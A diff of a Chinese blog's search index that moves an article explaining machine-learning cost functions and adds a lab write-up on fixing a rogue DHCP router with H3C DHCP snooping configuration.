-<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_bS2PBfg7tJ.png" title alt data-align="center">
-
-<p>        当函数中 <code>w</code>  和 <code>b</code>  两个参数发生改变时，函数也会偏离或者靠近数据集，为了使假象函数跟接近于真实的目标函数或更能使其正确的表示这个数据集，此时就可以引入代价函数</p>
-<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_PNGYjBNfTI.png" title alt data-align="center">
-
-<p>        以平方误差代价函数为例，从最简单的单一参数来看，假设函数为：J<sub>w</sub> &#x3D; wx，平方误差代价函数的主要思想就是将实际数据给出的值与我们拟合出的线的对应值做差，求出我们拟合出的直线与实际的差距。</p>
-<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_QKEXlhGUBk.png" title alt data-align="center">
-
-<p>        为了使这个值不受个别极端数据影响而产生巨大波动，采用类似方差再取二分之一的方式来减小个别数据的影响。这样，就产生了代价函数：</p>
-<img title src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_dfDTIpbfSv.png" alt width="394" data-align="center">
-
-<p>将其扩充成2个参数，就变成了<img title src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_DkMygOkPLc.png" alt width="247" data-align="inline"></p>
-]]></content>
-      <categories>
-        <category>机器深度学习Deeplearning.AI</category>
-      </categories>
-      <tags>
-        <tag>AI理论基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>初始Metasploit</title>
     <url>/2023/04/02/%E5%88%9D%E5%A7%8BMetasploit-1/</url>
     <content><![CDATA[<p>环境：</p>
@@ -733,6 +838,49 @@
       </categories>
       <tags>
         <tag>metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代价函数</title>
+    <url>/2022/10/11/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/ApplicationFrameHost_Gvqy4wLebk.png"></p>
+<blockquote>
+<p>代价函数（Cost Function）在机器学习中的每一种算法中都很重要，因为训练模型的过程就是优化代价函数的过程，代价函数对每个参数的偏导数就是梯度下降中提到的梯度，防止过拟合时添加的正则化项也是加在代价函数后面的</p>
+</blockquote>
+<div>
+<h1><font color="CadetBlue">1.什么是代价函数</font>
+</h1>
+</div>
+
+<p>        概况来讲，任何能够衡量模型预测出来的值h(θ)与真实值y之间的差异的函数都可以叫做代价函数J(θ)。</p>
+<p>        代价函数就是用于找到最优解的目的函数，这也是代价函数的作用。</p>
+<p>　　<strong><mark>损失函数（Loss Function ）</mark></strong> 是定义在单个样本上的，算的是一个样本的误差。</p>
+<p>　　<strong><mark>代价函数（Cost Function ）</mark></strong> 是定义在整个训练集上的，是所有样本误差的平均，也就是损失函数的平均。</p>
+<p>　　<strong><mark>目标函数（Object Function）</mark></strong> 定义为：最终需要优化的函数。等于经验风险+结构风险（也就是Cost Function + 正则化项）。</p>
+<div>
+<h1><font color="CadetBlue">2.代价函数的作用是什么</font>
+</h1>
+</div>
+
+<p>        假设，给定一个关于 <code>x</code>  和 <code>y</code>  的数据集，该数据集可以被认定为一个线性回归模型，设定假象函数 : <font color="DeepSkyBlue">f<sub>w,b</sub></font> (x) &#x3D; <font color="DeepSkyBlue">w</font>x + <font color="DeepSkyBlue">b</font> </p>
+<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_bS2PBfg7tJ.png" title alt data-align="center">
+
+<p>        当函数中 <code>w</code>  和 <code>b</code>  两个参数发生改变时，函数也会偏离或者靠近数据集，为了使假象函数跟接近于真实的目标函数或更能使其正确的表示这个数据集，此时就可以引入代价函数</p>
+<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_PNGYjBNfTI.png" title alt data-align="center">
+
+<p>        以平方误差代价函数为例，从最简单的单一参数来看，假设函数为：J<sub>w</sub> &#x3D; wx，平方误差代价函数的主要思想就是将实际数据给出的值与我们拟合出的线的对应值做差，求出我们拟合出的直线与实际的差距。</p>
+<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_QKEXlhGUBk.png" title alt data-align="center">
+
+<p>        为了使这个值不受个别极端数据影响而产生巨大波动，采用类似方差再取二分之一的方式来减小个别数据的影响。这样，就产生了代价函数：</p>
+<img title src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_dfDTIpbfSv.png" alt width="394" data-align="center">
+
+<p>将其扩充成2个参数，就变成了<img title src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/POWERPNT_DkMygOkPLc.png" alt width="247" data-align="inline"></p>
+]]></content>
+      <categories>
+        <category>机器深度学习Deeplearning.AI</category>
+      </categories>
+      <tags>
+        <tag>AI理论基础</tag>
       </tags>
   </entry>
   <entry>
@@ -1006,5 +1154,37 @@
       <categories>
         <category>机器深度学习Deeplearning.AI</category>
       </categories>
+  </entry>
+  <entry>
+    <title>私接路由器故障排除 - DHCP Spooning</title>
+    <url>/2025/03/31/%E7%A7%81%E6%8E%A5%E8%B7%AF%E7%94%B1%E5%99%A8%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4-DHCP-Spooning/</url>
+    <content><![CDATA[<h1 id="私接路由器故障排除-DHCP-Spooning"><a href="#私接路由器故障排除-DHCP-Spooning" class="headerlink" title="私接路由器故障排除 - DHCP Spooning"></a>私接路由器故障排除 - DHCP Spooning</h1><blockquote>
+<p>DHCP Snooping是<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/DHCP.html">DHCP</a>（Dynamic Host Configuration Protocol，<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/DHCP.html">动态主机配置协议</a>）的一种安全特性，用于保证DHCP客户端从合法的DHCP服务器获取IP地址，并记录DHCP客户端IP地址与MAC地址等参数的对应关系。DHCP Snooping可以抵御网络中针对DHCP的各种攻击，为用户提供更安全的网络环境和更稳定的网络服务。</p>
+</blockquote>
+<h2 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h2><p>所有主机无法上网，或只有部分主机可以上网</p>
+<h2 id="模拟环境"><a href="#模拟环境" class="headerlink" title="模拟环境"></a>模拟环境</h2><p><img src="https://2d0889b.webp.li/20250331165530664.png"></p>
+<p>合法地址：192.168.1.1</p>
+<p>非法地址：172.16.1.1</p>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">R1</span>]</span><br><span class="line">[<span class="meta">H3C</span>]dhcp enable</span><br><span class="line">[<span class="meta">H3C</span>]<span class="built_in">int</span> GE0/<span class="number">1</span></span><br><span class="line">[<span class="meta">H3C-GigabitEthernet0/1</span>]ip <span class="keyword">add</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">24</span></span><br><span class="line">[<span class="meta">H3C-GigabitEthernet0/1</span>]quit</span><br><span class="line">[<span class="meta">H3C</span>]dhcp server ip-pool <span class="number">1</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> mask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]gateway-list <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]dns-list <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]quit</span><br><span class="line">[<span class="meta">H3C</span>]<span class="built_in">int</span> GE0/<span class="number">1</span></span><br><span class="line">[<span class="meta">H3C-GigabitEthernet0/1</span>]dhcp server apply ip-pool <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">R2</span>]</span><br><span class="line">[<span class="meta">H3C</span>]dhcp enable</span><br><span class="line">[<span class="meta">H3C</span>]<span class="built_in">int</span> GE0/<span class="number">0</span></span><br><span class="line">[<span class="meta">H3C-GigabitEthernet0/0</span>]ip <span class="keyword">add</span> <span class="number">172.16</span><span class="number">.1</span><span class="number">.1</span> <span class="number">24</span></span><br><span class="line">[<span class="meta">H3C-GigabitEthernet0/0</span>]quit</span><br><span class="line">[<span class="meta">H3C</span>]dhcp server ip-pool <span class="number">1</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]network <span class="number">172.16</span><span class="number">.1</span><span class="number">.0</span> mask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]gateway-list <span class="number">172.16</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]dns-list <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">[<span class="meta">H3C-dhcp-pool-1</span>]quit</span><br><span class="line">[<span class="meta">H3C</span>]<span class="built_in">int</span> GE0/<span class="number">0</span></span><br><span class="line">[<span class="meta">H3C-GigabitEthernet0/0</span>]dhcp server apply ip-pool <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>不启用私接路由器的时候可以正常获取到正确的IP</p>
+<p><img src="https://2d0889b.webp.li/20250331170500481.png"></p>
+<p>启用后主机收到了私接路由器的DHCP包</p>
+<p><img src="https://2d0889b.webp.li/20250331171054040.png" alt="image-20250331171054008"></p>
+<p><img src="https://2d0889b.webp.li/20250331171113963.png" alt="image-20250331171113917"></p>
+<p>至于2个路由器谁先应答，只能说玄学。所以有可能会获取到正常的IP</p>
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>下挂的交换机开启DHCP Spooning功能，将上游路由器设置为受信的DHCP服务器</p>
+<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">[H3C]dhcp snooping enable</span><br><span class="line">[H3C]int GE1/<span class="number">0</span>/<span class="number">1</span></span><br><span class="line">[H3C-GigabitEthernet1/<span class="number">0</span>/<span class="number">1</span>]dhcp snooping trust</span><br><span class="line">[H3C]dis dhcp snooping trust</span><br><span class="line"> DHCP snooping is enabled.</span><br><span class="line"> Interface                                       Trusted</span><br><span class="line"> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>                 <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"> GigabitEthernet1/<span class="number">0</span>/<span class="number">1</span>                    Trusted</span><br></pre></td></tr></table></figure>
+
+<h2 id="现象-1"><a href="#现象-1" class="headerlink" title="现象"></a>现象</h2><p>主机已经能够获取到正确的IP</p>
+]]></content>
+      <categories>
+        <category>网络工程</category>
+      </categories>
+      <tags>
+        <tag>排障</tag>
+      </tags>
   </entry>
 </search>
